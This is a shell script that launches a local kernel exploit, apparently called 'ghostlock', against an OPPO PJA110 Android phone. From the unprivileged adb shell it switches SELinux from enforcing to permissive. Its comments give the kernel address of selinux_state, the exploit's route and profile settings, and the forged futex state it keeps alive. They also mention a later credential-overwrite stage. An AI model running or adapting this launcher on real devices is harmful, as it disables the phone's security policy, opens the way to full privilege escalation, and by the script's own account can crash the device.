#!/system/bin/sh
# W1: SELinux enforcing -> permissive on the OPPO PJA110, from uid 2000 shell,
# with no root and no KSU.
#
# This is the one configuration that has landed on hardware; see
# docs/analysis/device-gates/CPP20-20260925-w1-selinux-pass.md.
#   route=3 MulticastWaiter, mcast_waiter_off=32, tcp6 carrier,
#   profile = dev-profiles/gl-w1-profile.bin (kernel_phys_load=0 -> falls back to
#   the compiled-in P0_KERNEL_PHYS_LOAD=0xa8000000, which makes the alias of
#   selinux_state resolve to 0xffffff802b3f9990 on this build).
#
# Layout expected next to this script:
#   /data/local/tmp/gl-w1/ghostlock     (static aarch64 build of src/core)
#   /data/local/tmp/gl-w1/profile.bin   (the GLK1 profile above)
#
# WARNINGS -- each of these was measured, not assumed:
#   * --profile MUST be an absolute path.  The loader opens the string as-is and
#     the runtime rewrites HOME, so a relative path fails with
#     "cannot load resolved profile" even for a perfectly valid GLK1 file.
#   * The process parks after W1 to keep the forged PI state alive.  Do NOT kill
#     it: the kernel's exit-time PI/futex cleanup over that forged state wedges
#     the machine.
#   * The effect is NOT persistent: a reboot restores Enforcing.
#   * On this handset the platform reacts to this activity (observed: the system
#     was restarted shortly after a landing).  Only run it when that is
#     acceptable, and never run W2 (cred write) without an explicit decision.

DIR=/data/local/tmp/gl-w1
cd "$DIR" || exit 1

export GHOSTLOCK_HOME="$DIR"
export GHOSTLOCK_W1_ONLY=1
export GHOSTLOCK_PARK_AFTER_W1=1
export GHOSTLOCK_MCAST_SOCKET=tcp6

echo "W1: before: enforce=$(getenforce) ($(cat /sys/fs/selinux/enforce))"
echo "W1: target alias is printed below as 'W1: SELinux target=...'"
exec ./ghostlock --profile "$DIR/profile.bin"
# After it lands ("Write 1 complete" + "parking after W1"), check from another
# shell:  getenforce           -> Permissive
#         ps -A | grep ghostlock -> the parked process is still there
